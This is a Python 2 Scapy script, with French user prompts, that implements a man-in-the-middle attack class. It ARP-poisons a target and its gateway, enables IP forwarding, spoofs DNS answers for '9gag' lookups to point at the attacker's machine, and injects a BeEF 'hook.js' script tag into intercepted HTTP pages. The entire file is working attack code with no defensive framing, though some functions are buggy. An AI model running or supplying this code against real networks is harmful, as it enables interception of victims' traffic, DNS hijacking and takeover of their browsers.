#! /usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *

import subprocess
import threading
import time
import os, sys
import re

class HostUnreachable(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

class MITM(object):

    ACK = 0x10

    def __init__(self, gw, target):
        if gw: self.gateway = gw
        else:
            print "Aucune passerelle indiquée..."
            self.gateway = self.findGateway()

        self.hooked = False
        self.target = target
        self.MAC = {}
        self.getMAC()

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def findGateway(self):
        r = raw_input("Souhaitez-vous la rechercher automatiquement ? [O/n]")
        if r.upper() == "N":
            gw = raw_input("Merci d'indiquer l'adresse à utiliser: ")
        elif r.upper() == "O" or r == '':
            try:
                out = subprocess.check_output(['netstat', '-nr']).split('\n')[2:]
                netstat = [[x for x in n.split(' ') if x] for n in out]
                for route in netstat:
                    if route[0] == "0.0.0.0":
                        print "Passerelle trouvée: ", route[1]
                        return route[1]

            except: print "Impossible de déterminer la passerelle par défaut." ; sys.stdout.flush()
            # print "test", netstat
        else: self.findGateway()

    def getMAC(self):
        a = arping(self.target, retry=5, verbose=0)[0]
        # print a[0], a[1]
        # a = a[0]
        if len(a) == 0: raise HostUnreachable("Host are not replying to ARP requests.")
        else: self.MAC[a[0][1][ARP].psrc] = a[0][1][ARP].hwsrc

    def fakeping(self, frm='', to=''):
        # a = arping(self.target, verbose=0)[0]
        ping = Ether() / IP(src=frm, dst=to) / ICMP(type="echo-request")
        r = srp1(ping, timeout=.5, verbose=0)
        if r == None:
            print '.',
            sys.stdout.flush()
            return False
        else:
            print "\nSuccessfull MITM"
            print self.gateway + "-> unknown MAC"
            print "\t\\\n\t \\\n\t  \\\n\tlocalhost -> " + r[Ether].dst + "\n\t  /\n\t /\n\t/"
            print r[IP].src, '->', r[Ether].src
            print "Interception is in progress..."
            sys.stdout.flush()
            self.MAC[r[IP].src] = r[Ether].src
            return True

    def arpPoisoning(self) :
        p1 = Ether(dst=self.MAC[self.target]) / ARP(op="who-has", psrc=self.gateway, pdst=self.target)
        p2 = Ether() / ARP(op="who-has", psrc=self.target, pdst=self.gateway)
        # Poisonning talbe
        # sendp(p, inter=0.!5, count=100, verbose=0)
        # Mainting spoofing
        print "Poisoning", ; sys.stdout.flush()
        while True:
            try :
                sendp(p1, count=1, verbose=0)
                sendp(p2, count=1, verbose=0)
                if not self.hooked: self.hooked = self.fakeping(frm=self.gateway, to=self.target)
                else:
                    # self.beefSpoof()
                    # self.dnsSpoof()
                    time.sleep(1)
            except KeyboardInterrupt :
                print "Stopping"
                sys.stdout.flush()
                sys.exit()
    def dnsSpoof(self):
        sniff(filter="udp port 53 and ip src " + self.target, prn=self.fakeDNS)

    def beefSpoof(self):
        sniff(filter="ip dst " + self.target, prn=self.injectBeef)

    def injectBeef(self, pkt):
        print pkt.summary()
        if (TCP in pkt and pkt[TCP].flags & MITM.ACK and reply.haslayer(Raw)) and self.hooked:
            if "</head>" in pkt[Raw].load:
                spfResp = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=80, dport=pkt[TCP].dport, flags=pkt[TCP].flags) / Raw()
                spfResp[Raw].load = spfResp[Raw].load.replace('</head>', '<script src="' + self.gateway + ':3000/hook.js"></script></head>')
                send(spfResp,verbose=0)
                return "Hook sent !"

            else:
                return self.send(pkt, verbose=0)
        else:
            return False

    def fakeDNS(self, pkt):
        if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != self.gateway) and self.hooked:
            if "9gag" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src) / UDP(dport=pkt[UDP].sport, sport=53) / DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=self.gateway)\
                    /DNSRR(rdata=self.gateway))#,rrname="9gag.com"))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent"

            else:
                #make DNS query, capturing the answer and send the answer
                return self.forwardDNS(pkt)
        else:
            return False

    def forwardDNS(self, orig_pkt):
        print "Forwarding: " + orig_pkt[DNSQR].qname
        response = sr1(IP(dst="8.8.8.8") / UDP(sport=orig_pkt[UDP].sport) / DNS(rd=1,id=orig_pkt[DNS].id,qd=DNSQR(qname=orig_pkt[DNSQR].qname)),verbose=0)
        respPkt = IP(dst=orig_pkt[IP].src) / UDP(dport=orig_pkt[UDP].sport) / DNS()
        respPkt[DNS] = response[DNS]
        send(respPkt, verbose=0)
        return "Responding: " + respPkt.summary()

#
# if __name__ == "__main__":
    # a = MITM("137.194.22.254", "137.194.22.215")
    # a = MITM("192.168.0.1", "192.168.0.11")
    # t = threading.Thread(target=a.arpPoisoning())
    # t.start()
    # time.sleep(2)
        # time.sleep(0.1)
